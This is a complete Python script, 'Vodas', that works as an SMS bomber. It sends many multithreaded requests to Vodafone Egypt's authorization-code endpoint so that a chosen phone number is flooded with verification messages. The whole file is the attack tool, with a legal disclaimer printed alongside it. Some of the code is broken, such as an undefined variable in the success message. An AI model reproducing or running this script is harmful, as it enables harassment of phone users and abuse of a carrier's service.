#!/usr/bin/env python3
import requests,time,threading
from queue import Queue
from optparse import OptionParser
l1st = None
num = None
q = Queue()
def getargs():
	global num,l1st,thr,kam
	optp = OptionParser(add_help_option=False)
	optp.add_option("-n","--number",dest='num')
	optp.add_option("-h","--help",dest="helper",action='store_true')
	optp.add_option("-m","--many",dest='kam',type='int')
	optp.add_option("-t","--threads",dest='thr',type='int')
	opts, args = optp.parse_args()
	if opts.num:
		num = opts.num
	if opts.helper:
		print("""Options:
-h, --help         | show this help menu
-n, --number=NUM   | Add The number of target
-m, --many=10      | How many messages you want send it
-t, --threads=10   | Max number of concurrent HTTP(s) requests (default 10)
""")
		exit()
	if opts.kam:
		kam = opts.kam
	else:
		kam = 5
	if opts.thr:
		thr = opts.thr
	if opts.num ==None:
		print('[-] Add The number for start ..!')
		exit()
def logo():
	print("""\033[91m
\t _    __          __      _____
\t| |  / /___  ____/ /___ _/ ___/
\t| | / / __ \/ __  / __ `/\__ \ 
\t| |/ / /_/ / /_/ / /_/ /___/ / 
\t|___/\____/\__,_/\__,_//____/  
\t                               
\t\033[93m# Coded By : Khaled Nassar @Knassar702\033[0m\n
[!] legal disclaimer: Usage of Vodas for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
""")
	time.sleep(1)
def go(number):
	try:
		r = requests.get('https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode',params={'mobileNumber':str(number)})
		print(f"[+] Success | {number} | {i}")
	except:
		print("[-]")
def threader():
	while True:
		item = q.get()
		go(item)
		q.task_done()
def exploit(number=None,thr=10):
	if number:
		print(f"[!] Starting\n[!] How many messages [{kam}]\n<------------------->")
		for i in range(thr):
			p1 = threading.Thread(target=threader)
			p1.daemon = True
			p1.start()
		for i in range(kam):
			q.put(number)
		q.join()
		exit()
if __name__ == '__main__':
	logo()
	getargs()
	if num:
		if thr:
			exploit(number=num,thr=thr)
		exploit(number=num,thr=thr)
	else:
		exit()
